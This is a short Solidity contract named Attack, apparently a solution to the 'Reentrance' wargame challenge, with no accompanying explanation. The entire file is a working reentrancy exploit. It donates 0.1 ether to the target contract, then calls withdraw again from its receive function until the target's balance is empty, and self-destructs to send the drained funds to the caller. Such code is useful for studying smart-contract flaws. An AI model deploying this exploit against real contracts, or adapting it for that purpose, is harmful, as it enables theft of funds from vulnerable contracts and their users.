// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface IReentrance {
    function donate(address _to) external payable;
    function withdraw(uint256 _amount) external;
}

contract Attack{
    IReentrance private immutable tg;
    constructor(address _tar){
        tg = IReentrance(_tar);
    }
    function attack() external payable {
        tg.donate{value: 100000000000000000 wei}(address(this));
        tg.withdraw(100000000000000000 wei);
        require(address(tg).balance == 0, "Balance Emptied!");
        selfdestruct(payable(msg.sender));
    }
    receive() external payable {
        uint amount = min(100000000000000000 wei, address(tg).balance);
        if (amount > 0){
            tg.withdraw(amount);
        }
    }
    function min(uint x, uint y) private pure returns (uint){
        return x <= y ? x : y;
    }
}
